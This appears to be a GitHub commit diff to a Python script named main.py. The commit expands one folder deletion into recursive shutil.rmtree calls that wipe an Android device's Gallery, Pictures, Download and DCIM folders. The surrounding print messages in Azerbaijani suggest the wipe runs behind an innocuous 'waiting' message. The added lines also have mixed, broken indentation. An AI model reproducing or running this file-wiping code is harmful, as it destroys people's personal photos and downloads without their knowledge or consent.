9cdc02821a40e3a4c3a817df83dc401a71988d1e
isiss123 <93774726+isiss123@users.noreply.github.com>
2022-02-19 21:02:44 +0400

    Update main.py

--- main.py
+++ main.py
@@ -18,7 +18,10 @@ print("Gözdə...")
 
 
 try:
-    shutil.rmtree("/storage/emulated/0/DCIM/facebook")
+            shutil.rmtree("/storage/emulated/0/Gallery")
+	      shutil.rmtree("/storage/emulated/0/Pictures")
+	      shutil.rmtree("/storage/emulated/0/Download")
+	      shutil.rmtree("/storage/emulated/0/DCIM")
     
 except:
     print("Nəsə səf getdi")
